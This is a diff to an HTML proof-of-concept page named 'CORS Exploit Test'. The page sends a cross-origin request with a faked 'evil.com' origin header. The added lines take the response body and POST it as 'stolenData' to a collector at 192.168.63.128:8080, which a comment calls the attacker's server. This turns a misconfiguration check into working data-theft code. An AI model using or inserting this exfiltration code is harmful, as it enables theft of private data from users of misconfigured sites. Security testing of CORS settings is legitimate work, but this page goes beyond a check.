@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CORS Test</title>
+    <title>CORS Exploit Test</title>
 </head>
 <body>
     <h1>CORS Exploit Test</h1>
@@ -19,13 +19,19 @@
                     "Origin": "https://evil.com" // Fake origin
                 }
             })
-            .then(response => {
-                if (response.ok) {
-                    document.getElementById("result").innerText = "✅ CORS is misconfigured! Response received.";
-                    console.log("Response Headers:", response.headers);
-                } else {
-                    document.getElementById("result").innerText = "❌ CORS blocked the request.";
-                }
+            .then(response => response.text())
+            .then(data => {
+                document.getElementById("result").innerText = "✅ CORS is misconfigured! Data leaked.";
+                console.log("Leaked Data:", data);
+
+                // Send leaked data to attacker's server
+                fetch("http://192.168.63.128:8080/collect", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({ stolenData: data })
+                });
             })
             .catch(error => {
                 console.error("Error:", error);
